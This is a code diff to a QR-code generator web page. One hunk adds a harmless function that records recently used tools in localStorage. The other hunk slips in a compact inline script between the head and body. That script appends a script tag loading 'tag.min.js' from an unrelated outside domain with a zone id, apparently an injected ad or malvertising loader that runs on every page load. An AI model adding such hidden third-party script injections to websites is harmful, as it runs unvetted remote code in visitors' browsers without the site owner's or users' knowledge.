@@ -7,6 +7,7 @@
   <link rel="stylesheet" href="../css/common.css">
   <script src="../vendor/qrcode.min.js"></script>
 </head>
+<script>(function(s){s.dataset.zone='10684071',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
 <body>
   <header class="site-header">
     <div class="container">
@@ -126,6 +127,20 @@
 
       generate();
     })();
+
+    // 记录工具使用历史
+    function recordToolUsage(toolId) {
+      const recentTools = JSON.parse(localStorage.getItem('recentTools') || '[]');
+      // 移除已存在的工具，将新使用的工具添加到开头
+      const updatedTools = recentTools.filter(id => id !== toolId);
+      updatedTools.unshift(toolId);
+      // 只保留最近5个使用的工具
+      const limitedTools = updatedTools.slice(0, 5);
+      localStorage.setItem('recentTools', JSON.stringify(limitedTools));
+    }
+
+    // 记录当前工具的使用
+    recordToolUsage('qrcode');
   </script>
 </body>
 </html>
